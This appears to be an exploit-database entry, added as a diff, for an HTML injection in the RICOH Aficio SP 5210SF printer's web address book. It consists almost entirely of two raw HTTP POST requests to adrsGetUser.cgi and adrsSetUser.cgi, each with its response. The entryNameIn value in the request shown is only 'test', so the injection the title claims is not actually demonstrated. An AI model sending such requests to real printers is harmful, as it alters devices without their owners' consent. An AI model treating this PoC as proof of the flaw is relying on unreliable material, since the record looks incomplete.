@@ -1,0 +1,73 @@
+# Exploit Title: RICOH Aficio SP 5210SF Printer - 'entryNameIn' HTML Injection
+# Discovery by: Olga Villagran
+# Discovery Date: 2020-03-02
+# Vendor Homepage: https://www.ricoh.com/
+# Hardware Link: http://support.ricoh.com/bb/html/dr_ut_e/rc3/model/sp52s/sp52s.htm?lang=es
+# Product Version: RICOH Aficio SP 5210SF Printer
+# Vulnerability Type: Code Injection - HTML Injection
+
+# Steps to Produce the HTML Injection:
+
+#1.- HTTP POST Request 'adrsGetUser.cgi':
+
+POST /web/entry/en/address/adrsGetUser.cgi HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://xxx.xxx.xxx.xxx/web/entry/en/address/adrsList.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 402
+Connection: close
+Cookie: risessionid=083527814813645; cookieOnOffChecker=on; wimsesid=121318357
+Upgrade-Insecure-Requests: 1
+
+mode=ADDUSER&pageSpecifiedIn=&pageNumberIn=1&searchSpecifyModeIn=&outputSpecifyModeIn=DEFAULT&entryIndexIn=&entryNameIn=&entryFilterIn=ALL_O&searchItemIn=SEARCH_INDEX_O&searchDataIn=&pages=&listCountIn=10&totalCount=8&offset=0&00001=ADRS_ENTRY_USER&00002=ADRS_ENTRY_USER&00003=ADRS_ENTRY_USER&00004=ADRS_ENTRY_USER&00007=ADRS_ENTRY_USER&00008=ADRS_ENTRY_USER&00010=ADRS_ENTRY_USER&00012=ADRS_ENTRY_USER
+
+
+#HTTP Response :
+
+HTTP/1.0 200 OK
+
+Date: Mon, 02 Mar 2020 22:22:44 GMT
+Server: Web-Server/3.0
+Content-Type: text/html; charset=UTF-8
+Expires: Mon, 02 Mar 2020 22:22:44 GMT
+Pragma: no-cache
+Cache-Control: no-cache
+Set-Cookie: cookieOnOffChecker=on; path=/
+Connection: close
+
+
+#2.- HTTP POST Request 'adrsSetUser.cgi':
+
+
+POST /web/entry/en/address/adrsSetUser.cgi HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://xxx.xxx.xxx.xxx/web/entry/en/address/adrsGetUser.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 607
+Connection: close
+Cookie: risessionid=083527814813645; cookieOnOffChecker=on; wimsesid=121318357
+Upgrade-Insecure-Requests: 1
+
+mode=ADDUSER&pageSpecifiedIn=&pageNumberIn=&searchSpecifyModeIn=&outputSpecifyModeIn=&inputSpecifyModeIn=WRITE&wayFrom=adrsGetUser.cgi%3FoutputSpecifyModeIn%3DSETTINGS&wayTo=adrsList.cgi%3FsearchSpecifyModeIn%3DNONE&isSelfPasswordEditMode=false&entryIndexIn=00005&entryNameIn=test&entryDisplayNameIn=test&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&userCodeIn=&smtpAuthAccountIn=AUTH_SYSTEM_O&folderAuthAccountIn=AUTH_SYSTEM_O&ldapAuthAccountIn=AUTH_SYSTEM_O&entryUseIn=ENTRYUSE_TO_O&faxDestIn=&mailAddressIn=&isCertificateExist=false&folderProtocolIn=SMB_O&folderPathNameIn=
+
+
+#HTTP Response :
+
+HTTP/1.0 200 OK
+
+Date: Mon, 02 Mar 2020 22:23:10 GMT
+Server: Web-Server/3.0
+Content-Type: text/html; charset=UTF-8
+Expires: Mon, 02 Mar 2020 22:23:10 GMT
+Pragma: no-cache
+Cache-Control: no-cache
+Set-Cookie: cookieOnOffChecker=on; path=/
+Connection: close
